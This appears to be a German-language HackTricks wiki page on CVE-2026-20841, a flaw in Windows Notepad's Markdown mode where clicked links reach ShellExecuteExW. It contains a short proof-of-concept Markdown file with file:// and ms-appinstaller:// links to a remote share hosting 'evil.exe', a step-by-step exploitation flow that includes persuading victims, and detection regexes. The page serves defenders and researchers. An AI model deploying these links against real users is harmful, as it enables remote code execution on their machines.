# Windows Protocol Handler / ShellExecute Abuse (Markdown-Renderer)

{{#include ../banners/hacktricks-training.md}}

Moderne Windows-Anwendungen, die Markdown/HTML rendern, wandeln von Benutzern bereitgestellte Links häufig in anklickbare Elemente um und übergeben sie an `ShellExecuteExW`. Ohne strikte Allowlist für Schemes kann jeder registrierte Protocol Handler (z. B. `file:`, `ms-appinstaller:`) ausgelöst werden, was zur Codeausführung im Kontext des aktuellen Benutzers führen kann.<sup>[[1]](#references)</sup>

## ShellExecuteExW-Angriffsfläche im Markdown-Modus von Windows Notepad
- Notepad wählt den Markdown-Modus **nur für `.md`-Erweiterungen** über einen festen Stringvergleich in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Unterstützte Markdown-Links:
- Standard: `[text](target)`
- Autolink: `<target>` (wird als `[target](target)` gerendert), daher sind beide Syntaxvarianten für Payloads und Detections relevant.
- Link-Klicks werden in `sub_140170F60()` verarbeitet, wobei eine schwache Filterung erfolgt und anschließend `ShellExecuteExW` aufgerufen wird.
- `ShellExecuteExW` leitet an **jeden konfigurierten Protocol Handler** weiter, nicht nur an HTTP(S).<sup>[[1]](#references)</sup>

### Überlegungen zum Payload
- Alle `\\`-Sequenzen im Link werden vor `ShellExecuteExW` zu `\` **normalisiert**, was sich auf UNC-/Path-Crafting und Detections auswirkt.
- `.md`-Dateien sind **standardmäßig nicht mit Notepad verknüpft**; das Opfer muss die Datei weiterhin in Notepad öffnen und auf den Link klicken. Nach dem Rendern ist der Link jedoch anklickbar.
- Gefährliche Beispiel-Schemes:<sup>[[1]](#references)</sup>
- `file://`, um einen lokalen/UNC-Payload zu starten.
- `ms-appinstaller://`, um App-Installer-Abläufe auszulösen. Auch andere lokal registrierte Schemes können missbraucht werden.

### Minimales PoC-Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitationsablauf
1. Erstelle eine **`.md`-Datei**, sodass Notepad sie als Markdown rendert.
2. Bette einen Link mit einem gefährlichen URI-Schema ein (`file:`, `ms-appinstaller:` oder jeder installierte Handler).
3. Übertrage die Datei (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB oder ähnlich) und überzeuge den Benutzer, sie in Notepad zu öffnen.
4. Beim Anklicken wird der **normalisierte Link** an `ShellExecuteExW` übergeben, und der entsprechende Protokoll-Handler führt den referenzierten Inhalt im Kontext des Benutzers aus.<sup>[[1]](#references)[[2]](#references)</sup>

## Erkennungsideen
- Überwache die Übertragung von `.md`-Dateien über Ports/Protokolle, die häufig Dokumente übertragen: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parse Markdown-Links (Standard- und Autolinks) und suche nach **nicht zwischen Groß- und Kleinschreibung unterscheidendem** `file:` oder `ms-appinstaller:`.
- Vom Anbieter empfohlene Regexe zum Erkennen des Zugriffs auf entfernte Ressourcen:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Das Patch-Verhalten soll **lokale Dateien und HTTP(S) allowlisten**; alles andere, was `ShellExecuteExW` erreicht, ist verdächtig. Erweitern Sie die Erkennungen bei Bedarf auf andere installierte Protocol-Handler, da die Angriffsfläche je nach System variiert.<sup>[[1]](#references)</sup>

## Referenzen
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
